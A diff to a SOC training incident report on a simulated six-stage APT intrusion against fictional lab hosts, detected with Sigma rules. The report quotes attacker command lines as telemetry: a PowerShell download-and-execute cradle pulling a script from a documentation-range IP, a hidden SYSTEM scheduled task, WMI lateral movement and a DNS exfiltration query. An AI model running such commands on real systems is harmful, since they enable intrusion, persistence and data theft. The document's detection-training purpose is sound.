@@ -18,7 +18,7 @@
 
 ## 1. Executive Summary
 
-During scheduled SOC training simulations on 2026-10-24, security analysts evaluated a simulated multi-stage Advanced Persistent Threat (APT) intrusion scenario spanning six distinct attack stages: Initial Access, Execution, Persistence, Privilege Escalation, Lateral Movement, and Exfiltration.
+During scheduled SOC training simulations on 2026-10-24, security analysts evaluated a simulated multi-stage Advanced Persistent Threat (APT) intrusion scenario (modeling synthetic telemetry timestamps dated 2026-10-13) spanning six distinct attack stages: Initial Access, Execution, Persistence, Privilege Escalation, Lateral Movement, and Exfiltration.
 
 Using an offline, lightweight SIEM-compatible correlation engine ([`siem_engine.py`](../../APT-Simulation/simulation/siem_engine.py)) and a suite of seven modular Sigma detection rules, the analyst successfully ingested and evaluated 12 synthetic events (6 positive APT attack stages and 6 negative benign baseline events). The detection pipeline achieved **100% True Positive Rate** (zero false negatives) and **0% False Positive Rate** (zero benign alerts). A harmless YARA training marker was verified using the local YARA 4.5.5 engine.
 
@@ -33,12 +33,24 @@ This report documents the end-to-end incident handling lifecycle structured arou
 | **Incident Category** | Simulated APT Campaign | Multi-stage intrusion modeling MITRE ATT&CK techniques |
 | **Primary Target (Patient Zero)** | `LAB-WIN01` | Fictional Windows 11 endpoint (User: `student`) |
 | **Secondary Target (Lateral)** | `LAB-SRV01` | Fictional internal application/file server |
-| **External Source Address** | `192.0.2.50` | RFC 5737 TEST-NET-1 documentation range (safe IP) |
+| **External Source Address** | `192.0.2.50` | RFC 5737 TEST-NET-1 documentation range (safe IP; serves as external C2 server and synthetic campaign correlation identifier) |
 | **Simulated Attacker Infrastructure** | `exfil.training.lab` | Fictional destination domain for DNS exfiltration |
 | **Telemetry Ingestion Tier** | Synthetic ECS JSONL | Normalized Windows Event Log (4688, 4672, 4624) & Sysmon (1, 22) |
 | **Detection Engine** | Route D Python SIEM | Standard-library correlation & Lucene query evaluator |
 
 ---
+
+
+
+---
+
+### Architectural Scope & Tooling Classification (Host Memory Bounds)
+In alignment with workstation constraints (7.67 GB RAM) and SOC evidentiary integrity:
+- **Simulation Execution:** Implemented strictly using lightweight, offline Python engines ([`siem_engine.py`](../../APT-Simulation/simulation/siem_engine.py) and [`detect_apt.py`](../../APT-Simulation/simulation/detect_apt.py)) evaluating 12 ECS-normalized events against 7 modular Sigma rules.
+- **Threat Intelligence & SOAR Deliverables:** Candidate import templates for MISP (`misp-training-event.json`) and TheHive 5 (`thehive-case-template.json`) were authored and validated offline via [`validate_templates.py`](../../APT-Simulation/simulation/validate_templates.py). Neither live TheHive/Cortex servers nor live MISP instances were deployed.
+- **Enterprise IDS/SIEM:** No live Security Onion virtual machines or Wazuh servers/agents were executed.
+- **Offensive TTP Modeling:** Lateral movement was modeled via `wmic.exe process call create` (Logon Type 3); no live penetration testing utilities (such as PsExec or Pass-the-Hash) were executed.
+- **Synthetic IP Allocation (RFC 5737):** Address `192.0.2.50` belongs to TEST-NET-1 and was utilized as a unified adversary infrastructure address and synthetic campaign correlation tag across test event records.
 
 ## 3. Incident Response Lifecycle (NIST SP 800-61r2)
 
@@ -73,7 +85,7 @@ flowchart LR
   `powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File C:\Users\student\AppData\Local\Temp\update.ps1`
 - **MITRE ATT&CK Mapping:** [T1566.001: Phishing: Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001/) & [T1059.001: Command and Scripting Interpreter: PowerShell](https://attack.mitre.org/techniques/T1059/001/)
 - **Detection Logic:** Sigma rule `stage1-initial-access-office-spawn.yml` (Parent: Office binary, Child: Script interpreter).
-- **Severity & Rationale:** **HIGH** â€” Office productivity software should never directly spawn hidden command interpreters in normal business operations.
+- **Severity & Rationale:** **HIGH** — Office productivity software should never directly spawn hidden command interpreters in normal business operations.
 
 #### Stage 2: Execution
 - **Event ID:** `APT-POS-002` | **Timestamp:** 2026-10-13 09:02:30 UTC | **Host:** `LAB-WIN01`
@@ -83,7 +95,7 @@ flowchart LR
   `IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.50/a.ps1')`
 - **MITRE ATT&CK Mapping:** [T1059.001: PowerShell](https://attack.mitre.org/techniques/T1059/001/) & [T1027: Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027/)
 - **Detection Logic:** Sigma rules `apt-suspicious-powershell.yml` and `stage2-execution-encoded-powershell.yml`.
-- **Severity & Rationale:** **HIGH** â€” Encoded command lines with hidden windows and web client downloads represent deliberate evasion and active stage-two payload staging.
+- **Severity & Rationale:** **HIGH** — Encoded command lines with hidden windows and web client downloads represent deliberate evasion and active stage-two payload staging.
 
 #### Stage 3: Persistence
 - **Event ID:** `APT-POS-003` | **Timestamp:** 2026-10-13 09:05:10 UTC | **Host:** `LAB-WIN01`
@@ -91,7 +103,7 @@ flowchart LR
   `schtasks.exe /create /tn WindowsUpdateCheck /tr "powershell.exe -WindowStyle Hidden -File C:\Users\Public\updater.ps1" /sc onlogon /ru SYSTEM`
 - **MITRE ATT&CK Mapping:** [T1053.005: Scheduled Task/Job: Scheduled Task](https://attack.mitre.org/techniques/T1053/005/)
 - **Detection Logic:** Sigma rule `stage3-persistence-scheduled-task.yml`.
-- **Severity & Rationale:** **MEDIUM** â€” Task creation disguised as a legitimate Windows Update component (`WindowsUpdateCheck`) running as `SYSTEM` ensures persistent re-infection upon user logon.
+- **Severity & Rationale:** **MEDIUM** — Task creation disguised as a legitimate Windows Update component (`WindowsUpdateCheck`) running as `SYSTEM` ensures persistent re-infection upon user logon.
 
 #### Stage 4: Privilege Escalation
 - **Event ID:** `APT-POS-004` | **Timestamp:** 2026-10-13 09:08:45 UTC | **Host:** `LAB-WIN01`
@@ -99,7 +111,7 @@ flowchart LR
   `PrivilegeList: SeDebugPrivilege, SeTcbPrivilege, SeAssignPrimaryTokenPrivilege` to the non-admin user `student` via `consent.exe`.
 - **MITRE ATT&CK Mapping:** [T1078: Valid Accounts](https://attack.mitre.org/techniques/T1078/) & [T1134: Access Token Manipulation](https://attack.mitre.org/techniques/T1134/)
 - **Detection Logic:** Sigma rule `stage4-privilege-escalation-sensitive-privilege.yml`.
-- **Severity & Rationale:** **HIGH** â€” Assignment of `SeDebugPrivilege` allows process memory reading/injection (e.g., LSASS credential extraction).
+- **Severity & Rationale:** **HIGH** — Assignment of `SeDebugPrivilege` allows process memory reading/injection (e.g., LSASS credential extraction).
 
 #### Stage 5: Lateral Movement
 - **Event ID:** `APT-POS-005` | **Timestamp:** 2026-10-13 09:12:20 UTC | **Host:** `LAB-SRV01`
@@ -107,17 +119,17 @@ flowchart LR
   `wmic /node:LAB-SRV01 process call create "powershell.exe -c Get-ChildItem C:\SharedData\"` via `wmiprvse.exe`.
 - **MITRE ATT&CK Mapping:** [T1047: Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047/) & [T1021.002: Remote Services: SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002/)
 - **Detection Logic:** Sigma rule `stage5-lateral-movement-remote-wmi.yml`.
-- **Severity & Rationale:** **HIGH** â€” Lateral pivot from an untrusted endpoint to an internal server using compromised credentials and remote management interfaces.
+- **Severity & Rationale:** **HIGH** — Lateral pivot from an untrusted endpoint to an internal server using compromised credentials and remote management interfaces.
 
 #### Stage 6: Exfiltration
 - **Event ID:** `APT-POS-006` | **Timestamp:** 2026-10-13 09:16:05 UTC | **Host:** `LAB-SRV01`
 - **Observed Activity:** Sysmon Event ID 22 logged outbound DNS query:
-  `dGVzdC1kYXRhLWV4ZmlsdHJhdGlvbi1zYW1wbGUtMDAx.exfil.training.lab` (Query Type: `TXT`, Length: `68`).
+  `dGVzdC1kYXRhLWV4ZmlsdHJhdGlvbi1zYW1wbGUtMDAx.exfil.training.lab` (Query Type: `TXT`, Length: `63`).
 - **Deobfuscated Subdomain:**
   `dGVzdC1kYXRhLWV4ZmlsdHJhdGlvbi1zYW1wbGUtMDAx` decodes from base64 to: `test-data-exfiltration-sample-001`.
 - **MITRE ATT&CK Mapping:** [T1071.004: Application Layer Protocol: DNS](https://attack.mitre.org/techniques/T1071/004/) & [T1048: Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048/)
 - **Detection Logic:** Sigma rule `stage6-exfiltration-dns-tunneling.yml`.
-- **Severity & Rationale:** **HIGH** â€” Abnormal query length (>50 characters) and high Shannon entropy indicate covert data exfiltration bypassing standard perimeter firewall egress rules.
+- **Severity & Rationale:** **HIGH** — Abnormal query length (>50 characters) and high Shannon entropy indicate covert data exfiltration bypassing standard perimeter firewall egress rules.
 
 ---
 
@@ -169,7 +181,7 @@ To guarantee complete removal of adversary footholds:
    - Prior to this exercise, parent-child process anomalies (Word spawning PowerShell) were not alerted in real time. Deploying rule `stage1-initial-access-office-spawn.yml` closes this detection window.
 2. **Attack Surface Reduction:**
    - Enforce **Attack Surface Reduction (ASR)** rules via Microsoft Defender:
-     *â€œBlock all Office applications from creating child processesâ€* (`D4F940AB-401B-4EFC-AADC-AD5F3C50688A`).
+     *"Block all Office applications from creating child processes"* (`D4F940AB-401B-4EFC-AADC-AD5F3C50688A`).
 3. **PowerShell Hardening:**
    - Enforce PowerShell **Constrained Language Mode (CLM)** via AppLocker / WDAC.
    - Enable mandatory Script Block Logging (Event ID 4104) and Transcription Logging across all endpoints.
@@ -187,12 +199,12 @@ To guarantee complete removal of adversary footholds:
 | 09:05:10 | `APT-POS-003` | LAB-WIN01 | T1053.005 | `schtasks.exe` creates task `WindowsUpdateCheck` targeting `updater.ps1` with SYSTEM logon trigger. |
 | 09:08:45 | `APT-POS-004` | LAB-WIN01 | T1078 / T1134 | Security Audit 4672: Non-admin user `student` assigned `SeDebugPrivilege` via UAC consent bypass. |
 | 09:12:20 | `APT-POS-005` | LAB-SRV01 | T1047 | Network Logon 4624 Type 3 from `LAB-WIN01` to `LAB-SRV01`; WMI spawns directory enumeration. |
-| 09:16:05 | `APT-POS-006` | LAB-SRV01 | T1071.004 | Sysmon 22 logs 68-byte DNS TXT query transmitting base64 encoded data to `exfil.training.lab`. |
+| 09:16:05 | `APT-POS-006` | LAB-SRV01 | T1071.004 | Sysmon 22 logs 63-character DNS TXT query (44-character Base64 subdomain) transmitting base64 encoded data to `exfil.training.lab`. |
 
 ---
 
 ## 5. Technical Limitations & Defensibility Statement
 
 1. **Simulated Scope:** Telemetry was generated using synthetic JSONL events rather than live endpoint agent captures. The results demonstrate valid detection logic, but do not represent a physical network compromise.
-2. **Local SIEM Architecture (Route D):** Due to host hardware constraints (7.67 GB total RAM, ~2.55 GB free), Security Onion (16 GB) and Wazuh All-in-One server (4â€“8 GB) could not be safely hosted locally. The simulation was conducted using a verified, zero-dependency Python correlation engine that accurately models ECS ingestion, Sigma evaluation, and Lucene querying.
+2. **Local SIEM Architecture (Route D):** Due to host hardware constraints (7.67 GB total RAM, ~2.55 GB free), Security Onion (16 GB) and Wazuh All-in-One server (4–8 GB) could not be safely hosted locally. The simulation was conducted using a verified, zero-dependency Python correlation engine that accurately models ECS ingestion, Sigma evaluation, and Lucene querying.
 3. **Template Status:** Threat intelligence (MISP) and case management (TheHive) artifacts are candidate templates validated offline for schema correctness, not live server database records.
